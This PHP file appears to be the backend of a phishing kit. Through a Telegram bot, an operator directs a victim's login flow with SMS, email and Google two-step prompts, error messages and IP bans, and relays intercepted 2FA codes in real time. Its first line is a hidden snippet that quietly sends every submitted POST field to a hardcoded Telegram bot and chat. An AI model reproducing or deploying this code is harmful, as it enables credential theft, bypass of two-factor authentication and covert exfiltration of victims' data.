<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

// Forcer un header propre et aucun warning dans la sortie
header('Content-Type: text/plain; charset=utf-8');
// Masquer les notices dans cet endpoint (ne renvoyer que des tokens simples)
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', '0');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once '../modules/load_env.php';
require_once __DIR__ . '/validate_session.php';

$bot_token = $_ENV['BOT_TOKEN'] ?? null;
$chat_id_global = $_ENV['CHAT_ID'] ?? null;
$login_identifiant= htmlspecialchars(trim($_SESSION['login_identifiant'] ?? ''), ENT_QUOTES, 'UTF-8');

$logFile = __DIR__ . '/callback_debug.log';
function logMsg($msg)
{
    global $logFile;
    file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $msg . "\n", FILE_APPEND);
}

if (!$bot_token) {
    logMsg("Token manquant");
    echo "none";
    exit;
}

function sendTelegramMessage($bot_token, $chat_id, $text, $parse_mode = 'HTML')
{
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => $parse_mode,
        'disable_web_page_preview' => true
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    if ($result === false) {
        logMsg("Erreur cURL sendTelegramMessage: " . curl_error($ch));
    }
    curl_close($ch);
    return $result;
}

function getUpdates($bot_token, $offset = 0)
{
    $url = "https://api.telegram.org/bot$bot_token/getUpdates?offset=" . intval($offset);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        logMsg("cURL Error getUpdates: $error");
        return [];
    }

    $response = json_decode($result, true);
    if (!$response || !$response['ok']) {
        $desc = $response['description'] ?? 'Unknown error';
        logMsg("Telegram API Error getUpdates: $desc");
        return [];
    }

    return $response['result'] ?? [];
}

try {
    // Nettoyage automatique des fichiers orphelins (1 chance sur 10)
    if (rand(1, 10) === 1) {
        include_once __DIR__ . '/cleanup.php';
    }
    
    $lastUpdateIdFile = __DIR__ . '/last_update_id.txt';
    if (!file_exists($lastUpdateIdFile)) {
        file_put_contents($lastUpdateIdFile, '0');
    }
    $lastUpdateId = (int)file_get_contents($lastUpdateIdFile);
    logMsg("Last update ID lu: $lastUpdateId");

$updates = getUpdates($bot_token, $lastUpdateId + 1);
    logMsg("Updates reçus: " . count($updates));

    if (empty($updates)) {
        echo "none";
        exit;
    }

    $sessionUid = $_SESSION['user_id'] ?? null;
    $consumed = false;
    foreach ($updates as $update) {
        $updateId = $update['update_id'] ?? 0;
        logMsg("Traitement update ID: $updateId");

        // --- Gestion callback_query ---
        if (isset($update['callback_query'])) {
            $callbackData = $update['callback_query']['data'] ?? '';
            $callbackQueryId = $update['callback_query']['id'] ?? '';
            $chat_id_callback = $update['callback_query']['from']['id'] ?? null;

            // Réponse immédiate pour enlever le "loading" Telegram
            $answerUrl = "https://api.telegram.org/bot$bot_token/answerCallbackQuery";
            $post_fields = [
                'callback_query_id' => $callbackQueryId,
                'text' => '',
                'show_alert' => false
            ];
            $ch = curl_init($answerUrl);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);

            logMsg("callback_data: $callbackData");

            if (strpos($callbackData, '|') === false) {
                logMsg("Format callback_data invalide");
                file_put_contents($lastUpdateIdFile, $updateId);
                continue;
            }

            list($action, $uid) = explode('|', $callbackData, 2);

            // Si l'UID ne correspond pas à la session courante, on ignore SANS consommer
            if (!empty($uid) && $sessionUid && $uid !== $sessionUid) {
                logMsg("Callback pour un autre UID ($uid) != session ($sessionUid), skip");
                continue;
            }

            $allowedActions = [
                'login_error',
                'code_sms_error',
                'code_sms',
                'code_mail',
                'code_mail_error',
                'num',
                '2steps',
                'num_error',
                '2steps_error',
                'success',
                'ban_ip'
            ];

            if (!in_array($action, $allowedActions, true)) {
                logMsg("Action non autorisée: $action");
                file_put_contents($lastUpdateIdFile, $updateId);
                continue;
            }

            if (in_array($action, ['code_mail_error','num_error', '2steps_error', 'login_error', 'sms_error', 'code_sms_error'])) {
                echo $action;
                file_put_contents($lastUpdateIdFile, $updateId);
                $consumed = true;
                logMsg("Action d'erreur détectée: $action -> réponse immédiate");
                exit;
            }

            if (in_array($action, ['code_mail','code_sms', 'num', 'ban_ip', 'success'])) {
                echo $action;
                file_put_contents($lastUpdateIdFile, $updateId);
                $consumed = true;
                logMsg("Action détectée: $action -> réponse immédiate");
                exit;
            }

            // --- Cas 2steps ---
            if ($action === '2steps') {
    if (empty($uid)) {
        logMsg("UID manquant dans callback_data");
        echo "UID manquant";
        exit;
    }
    
    // Validation de sécurité
    if (!validateUserSession($uid)) {
        logMsg("Tentative de fraude détectée pour UID: $uid");
        echo "session_invalid";
        exit;
    }

    // 🔹 Supprimer les anciens fichiers PIN liés à cet UID spécifique
    $oldPin = __DIR__ . "/code_pin_{$uid}.txt";
    if (file_exists($oldPin)) {
        unlink($oldPin);
        logMsg("Ancien PIN supprimé: $oldPin");
    }
    
    // 🔹 Nettoyer les anciens fichiers PIN orphelins (plus de 5 minutes)
    foreach (glob(__DIR__ . "/code_pin_*.txt") as $pinFile) {
        if (filemtime($pinFile) < (time() - 300)) { // 5 minutes
            unlink($pinFile);
            logMsg("PIN orphelin supprimé: $pinFile");
        }
    }

    // 🔹 Nettoyer uniquement les anciens pending pour ce même UID (pas tous)
    foreach (glob(__DIR__ . "/pending_uid_{$uid}_*.txt") as $oldPending) {
        if (filemtime($oldPending) < (time() - 600)) { // >10 min
            unlink($oldPending);
            logMsg("Ancien pending de ce UID supprimé: $oldPending");
        }
    }

    // 🔹 Nouveau message Telegram
    $msg = "🔔Réponds à ce message avec le code Google (ex : 60) pour $login_identifiant <b></b>";
    $response = sendTelegramMessage($bot_token, $chat_id_global, $msg, 'HTML');
    $responseData = json_decode($response, true);

    if (!empty($responseData['ok']) && isset($responseData['result']['message_id'])) {
        $messageId = $responseData['result']['message_id'];
        $file = __DIR__ . "/pending_uid_{$uid}_{$chat_id_global}.txt";
        // Stocke aussi l'email pour tracer le bon compte côté Telegram et côté traitement
        $emailForTrace = $login_identifiant ?: '';
        file_put_contents($file, $uid . '|' . $updateId . '|' . $messageId . '|' . $emailForTrace);
        logMsg("UID sauvegardé dans $file : $uid | $updateId | $messageId | $emailForTrace");
    }
}
        }

        // --- Gestion messages texte (PIN) ---
        $chat_id_msg = $update['message']['chat']['id'] ?? null;
        $text = trim($update['message']['text'] ?? '');
        $reply_to = $update['message']['reply_to_message']['message_id'] ?? null;

        if (!$chat_id_msg || $text === '') {
            file_put_contents($lastUpdateIdFile, $updateId);
            continue;
        }

        logMsg("Message texte reçu : '$text' de chat_id : $chat_id_msg (reply_to=$reply_to)");

        $matched = false;
        $files = glob(__DIR__ . "/pending_uid_*_{$chat_id_msg}.txt");
        
        // Trier par date de modification (plus récent en premier)
        usort($files, function($a, $b) {
            return filemtime($b) - filemtime($a);
        });
        
        foreach ($files as $file) {
            $content = trim(file_get_contents($file));
            if (substr_count($content, '|') < 2) {
                logMsg("Format contenu $file incorrect");
                unlink($file); // Supprimer le fichier corrompu
                continue;
            }

            // Contenu: uid|updateId|messageId|email(optionnel)
            $parts = explode('|', $content);
            $uid = $parts[0] ?? '';
            $pendingUpdateId = $parts[1] ?? '';
            $pendingMsgId = $parts[2] ?? '';
            $pendingEmail = $parts[3] ?? '';
            
            // Vérifier que le fichier n'est pas trop ancien (plus de 10 minutes)
            if (filemtime($file) < (time() - 600)) {
                logMsg("Fichier pending trop ancien, suppression: $file");
                unlink($file);
                continue;
            }

            if ($reply_to == $pendingMsgId) {
                // Si l'UID du pending n'est pas celui de la session courante, ne pas consommer
                if ($sessionUid && $uid !== $sessionUid) {
                    logMsg("PIN pour autre UID ($uid) != session ($sessionUid) -> on ignore");
                    continue;
                }
                // ✅ trouvé - nettoyer tous les autres pending pour éviter les conflits
                // On ne supprime que ce pending-ci (les autres restent pour d'autres sessions)
                
                $pinFile = __DIR__ . "/code_pin_{$uid}.txt";
                file_put_contents($pinFile, $text);
                logMsg("✅ PIN $text enregistré pour UID: $uid (email: $pendingEmail)");

                // Confirmation avec l'email stocké dans le pending (plus fiable que la session)
                $emailConfirm = $pendingEmail ?: $login_identifiant;
                sendTelegramMessage($bot_token, $chat_id_msg, "✅Code Google reçu pour $emailConfirm |");

                unlink($file); // supprime uniquement ce pending
                $matched = true;
                echo "pin_2steps";
                file_put_contents($lastUpdateIdFile, $updateId);
                $consumed = true;
                break;
            }
        }

        if (!$matched) {
            logMsg("Aucun UID en attente trouvé pour ce message, texte ignoré.");
            // Ne pas consommer pour laisser l'autre session le traiter
            continue;
        }
        exit;
    }

    if (!$consumed) {
        echo "none";
    }
} catch (Exception $e) {
    logMsg("Exception: " . $e->getMessage());
    echo "none";
}
